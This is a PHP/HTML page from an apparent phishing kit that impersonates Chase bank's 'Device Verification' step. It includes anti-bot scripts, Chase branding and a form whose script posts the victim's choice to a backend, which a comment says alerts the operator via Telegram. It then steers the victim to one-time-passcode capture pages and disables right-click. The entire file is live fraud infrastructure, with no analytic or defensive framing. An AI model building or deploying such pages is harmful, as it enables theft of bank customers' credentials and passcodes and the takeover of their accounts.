
<?php
    include './secure/anti1.php';
	include './secure/anti2.php';
	include './secure/anti3.php';
	include './secure/anti4.php';
	include './secure/anti5.php';
	include './secure/anti6.php';
	include './secure/anti7.php';
	include './secure/anti8.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex,nofollow">
    <title>Device Verification - chase.com</title>
    <link href="./css/bootstrap.min.css" rel="stylesheet">
    <link href="./css/shop-homepage.css" rel="stylesheet">
    <link href="./css/styles.css" rel="stylesheet">
    <link rel="shortcut icon" href="./img/chasefavicon.ico">
    <script src="https://kit.fontawesome.com/21cf0ca2ce.js" crossorigin="anonymous"></script>
    <style>
        body {
            background-color: #ffffff !important;
        }
        .logon-header {
            background-color: #117aca;
            background-image: none;
        }
        .verification-box {
            padding: 30px;
            margin-top: 50px;
            background-color: #ffffff;
        }
        .step-header {
            font-size: 14px;
            color: #666;
            margin-bottom: 10px;
        }
        .main-title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .verification-message {
            background-color: #f5f5f5;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 30px;
        }
        .verification-option {
            border: 2px solid #0074d9;
            border-radius: 5px;
            padding: 20px;
            margin-bottom: 15px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .verification-option:hover {
            background-color: #f0f8ff;
        }
        .verification-option input[type="radio"] {
            margin-right: 10px;
            transform: scale(1.3);
        }
        .verification-option label {
            cursor: pointer;
            margin: 0;
            font-size: 16px;
        }
        .btn-container {
            margin-top: 30px;
        }
        .btn-next {
            background-color: #0074d9;
            color: white;
            padding: 10px 24px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-right: 10px;
            height: 40px;
            min-width: 100px;
        }
        .btn-next:hover {
            background-color: #0056b3;
        }
        .btn-cancel {
            background-color: white;
            color: #0074d9;
            padding: 10px 24px;
            border: 2px solid #0074d9;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            height: 40px;
            min-width: 100px;
        }
        .already-code {
            margin-top: 20px;
            color: #0074d9;
            cursor: pointer;
            text-decoration: underline;
        }
        .overlay-spinner {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }
        .spinner-content {
            text-align: center;
            color: white;
        }
        .spinner-content i {
            font-size: 50px;
            margin-bottom: 20px;
        }
        .logon-content {
            background-color: #ffffff;
        }
        .logon-container {
            background-color: #ffffff;
            min-height: 100vh;
        }
        .jpui.raised.segment {
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body style="background-color: #ffffff; overflow-x: hidden; overflow-y: auto;">

<div id="overlay-spinner" class="overlay-spinner">
    <div class="spinner-content">
        <i class="fas fa-spinner fa-spin"></i>
        <p>Verifying your device...</p>
    </div>
</div>

<div class="logon-container">
    <header>
        <div class="logon-header">
            <a href="#" class="logolink"> </a>
        </div>
    </header>
    <main class="logon-content">
       <div class="container logon">
           <div class="row">
               <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3">
                   <div class="jpui raised segment verification-box">
                       <div class="step-header">Get verified · Step 1 of 2</div>
                       <div class="step-header" style="color: #0074d9; cursor: pointer;">Have a question?</div>
                       
                       <h2 class="main-title">We don't recognize this device</h2>
                       
                       <div class="verification-message">
                           <p style="margin: 0;">It looks like you're using a new device, or you changed its settings. Before you sign in, we need to confirm it's you.</p>
                       </div>
                       
                       <h3 style="font-size: 18px; margin-bottom: 20px;">How should we get in touch?</h3>
                       
                       <form id="verification-form">
                           <div class="verification-option" onclick="selectOption('phone')">
                               <input type="radio" name="verification_method" id="phone-option" value="phone" checked>
                               <label for="phone-option">
                                   <i class="fas fa-mobile-alt"></i> Send a notification to my phone
                               </label>
                           </div>
                           
                           <div class="verification-option" onclick="selectOption('different')">
                               <input type="radio" name="verification_method" id="different-option" value="different">
                               <label for="different-option">
                                   <i class="fas fa-envelope"></i> Contact me in a different way
                               </label>
                           </div>
                           
                           <div class="already-code" onclick="window.location.href='./otp.php'">
                               I already have a code.
                           </div>
                           
                           <div class="btn-container">
                               <button type="submit" class="btn-next">Next</button>
                               <button type="button" class="btn-cancel" onclick="window.location.href='./'">Cancel</button>
                           </div>
                       </form>
                   </div>
               </div>
           </div>
       </div>
    </main>
</div>

<footer class="logon-footer" id="logon-footer">
    <div class="footer-container" style="position:static;">
        <div class="container">
            <div class="social-links row">
                <div class="col-xs-12">
                    <span class="follow-text">Follow us:</span>
                    <img src="./img/cap.png" alt="" class="icon-links">
                </div>
            </div>
            <div class="footer-links row">
                <div class="col-xs-12">
                    <ul>
                        <li class="azadus">Contact us</li>
                        <li class="azadus">Privacy</li>
                        <li class="azadus">Security</li>
                        <li class="azadus">Terms of use</li>
                        <li class="azadus">Accessibility</li>
                        <li class="azadus">SAFE Act: Chase Mortgage Loan Originators</li>
                        <li class="azadus">Fair Lending</li>
                        <li class="azadus">About Chase</li>
                        <li class="azadus">J.P Morgan</li>
                        <li class="azadus">JPMorgan Chase &#38; Co.</li>
                        <li class="azadus">Careers</li>
                        <li class="azadus">Espa&ntilde;ol</li>
                        <li class="azadus">Chase Canada</li>
                        <li class="azadus">Site map</li>
                        <li>Member FDIC</li>
                        <li><i class="fas fa-home"></i>&nbsp;Equal Housing Lender</li>
                        <li class="copyright-label">&copy; 2024 JPMorgan Chase &#38; Co.</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</footer>

<script src="./js/jquery.js"></script>
<script src="./js/bootstrap.min.js"></script>
<script>
function selectOption(option) {
    if (option === 'phone') {
        document.getElementById('phone-option').checked = true;
    } else {
        document.getElementById('different-option').checked = true;
    }
}

document.getElementById('verification-form').addEventListener('submit', function(e) {
    e.preventDefault();
    
    var selectedMethod = document.querySelector('input[name="verification_method"]:checked').value;
    
    // Show overlay spinner
    document.getElementById('overlay-spinner').style.display = 'flex';
    
    // Send notification to Telegram about selected method
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "./config/device-verify.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    
    var loadingTime = selectedMethod === 'phone' ? 10000 : 4000; // 10s for phone, 4s for different
    var nextPage = selectedMethod === 'phone' ? './verify.php' : './otp.php';
    
    xhr.send("verification_method=" + selectedMethod);
    
    setTimeout(function() {
        window.location.href = nextPage;
    }, loadingTime);
});

document.addEventListener('contextmenu', function (e) {
    e.preventDefault();
});
</script>

</body>
</html>
